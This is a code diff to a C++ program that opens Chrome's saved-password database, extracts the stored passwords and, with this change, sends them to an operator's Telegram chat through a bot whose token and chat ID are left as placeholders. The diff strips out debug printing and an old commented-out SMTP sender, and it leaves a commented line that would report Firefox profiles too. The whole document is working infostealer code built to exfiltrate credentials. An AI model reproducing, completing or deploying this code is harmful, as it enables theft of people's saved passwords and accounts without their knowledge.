@@ -16,8 +16,6 @@
 #include <cstdlib>
 
 #include "sqlite3.h"
-#include <tgbot/tgbot.h>
-
 
 #ifdef _WIN32
     #include "windows/tools.h"
@@ -38,6 +36,14 @@ int main()
     try
     {
         sqlite3 *db;
+
+        const std::string TOKEN(""); //put your bot token here
+        const long ID = long(); // set your chat id here
+
+        TgBot::Bot bot(TOKEN);
+
+        Sender bot_sender(bot);
+
 #ifdef __linux__
         std::string chrome_db_path = "~/.config/google-chrome/Default";
         std::string firefox_db_path = "~/.mozilla/firefox/<profilename>";
@@ -58,12 +64,9 @@ int main()
 
         if( fs::exists(chrome_db_path))
         {
-            std::cout << "ch exists" << std::endl;
-
             std::stringstream pass;
             
             int rc = sqlite3_open(chrome_db_path.c_str(), &db);
-
             if( rc )
             {
                 std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
@@ -71,28 +74,16 @@ int main()
                 return 1;
             }
             pass = get_chrome_pass(db);
-            std::cout << pass.str();
-
-            //SMTPClient email("yoursmtpserver.com", 25, "user@yourdomain.com", "password");
-            //email.Send("from@yourdomain.com","to@somewhere.com","subject","Hello from C++ SMTP Client!");
-
+            bot_sender.send(ID, pass.str());
+            
             //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
         }
 
         if( fs::exists(firefox_db_path))
         {
             std::cout << "ff exists" << std::endl;
+            //bot_sender.send(ID, "ff exists");
         }
-
-    
-        std::string token("your_token");
-
-        TgBot::Bot bot(token);
-
-        
-
-        //Sender bot_sender(bot);
-        //bot_sender.send("@chat_id", "Hello"); // chat_id is in format "@your_name"
     }
     catch(std::exception &e)
     {
